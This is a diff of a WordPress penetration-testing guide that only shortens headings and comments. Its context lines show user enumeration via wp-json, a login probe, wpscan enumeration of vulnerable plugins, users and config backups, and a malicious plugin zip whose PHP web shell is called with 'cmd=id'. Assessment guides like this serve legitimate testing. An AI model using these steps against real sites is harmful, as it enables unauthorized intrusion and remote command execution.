@@ -76,7 +76,7 @@ Conduct comprehensive security assessments of WordPress installations including 
 3. **Credential Assessment** - Weak password findings
 4. **Exploitation Proof** - Shell access documentation
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: WordPress Discovery
 
@@ -293,7 +293,7 @@ curl -s http://target.com/wp-json/wp/v2/users?per_page=100
 curl -X POST -d "log=admin&pwd=wrongpass" http://target.com/wp-login.php
 ```
 
-### Phase 7: Comprehensive Enumeration
+### Phase 7: Enumeration
 
 Run all enumeration modules:
 
@@ -303,7 +303,7 @@ Run all enumeration modules:
 
 wpscan --url http://target.com -e at -e ap -e u
 
-# Alternative comprehensive scan
+# Alternative scan
 
 wpscan --url http://target.com -e vp,vt,u,cb,dbe
 
@@ -317,7 +317,7 @@ wpscan --url http://target.com -e vp,vt,u,cb,dbe
 
 # vp - Vulnerable plugins
 
-# u  - Users (1-10)
+# u - Users (1-10)
 
 # cb - Config backups
 
@@ -455,7 +455,7 @@ zip malicious.zip malicious.php
 curl "http://target.com/wp-content/plugins/malicious/malicious.php?cmd=id"
 ```
 
-### Phase 10: Advanced Techniques
+### Phase 10: Techniques
 
 #### XML-RPC Exploitation
 
@@ -572,7 +572,7 @@ wpscan --url https://target.com --disable-tls-checks
 - Document all testing activities
 - Follow responsible disclosure
 
-### Technical Limitations
+### Limitations
 
 - WAF may block scanning
 - Rate limiting may prevent brute-force
